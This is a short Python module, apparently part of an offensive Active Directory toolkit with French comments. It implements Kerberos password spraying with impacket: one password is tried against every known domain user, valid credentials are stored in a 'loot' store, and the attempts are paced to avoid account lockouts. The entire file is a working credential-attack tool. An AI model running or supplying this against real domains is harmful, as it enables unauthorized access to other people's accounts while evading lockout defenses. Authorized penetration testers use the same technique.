from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal


class Sprayer:
    """Password spraying via Kerberos pre-auth.
    Teste un mot de passe sur une liste d'users sans verrouiller
    les comptes trop vite (1 essai/user)."""

    def __init__(self, loot):
        self.loot = loot

    def spray_password(self, password):
        """Teste un password sur TOUS les users connus."""
        print(f"[*] Spraying '{password}' sur {len(self.loot.users)} users...")
        for user in list(self.loot.users):
            if self._test(user, password):
                self.loot.add_cred(user, password, "password")

    def _test(self, user, password):
        try:
            principal = Principal(
                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            getKerberosTGT(
                principal, password, self.loot.domain,
                None, None, None, kdcHost=self.loot.dc_ip,
            )
            return True   # TGT obtenu = creds valides
        except Exception:
            return False  # pre-auth failed ou autre
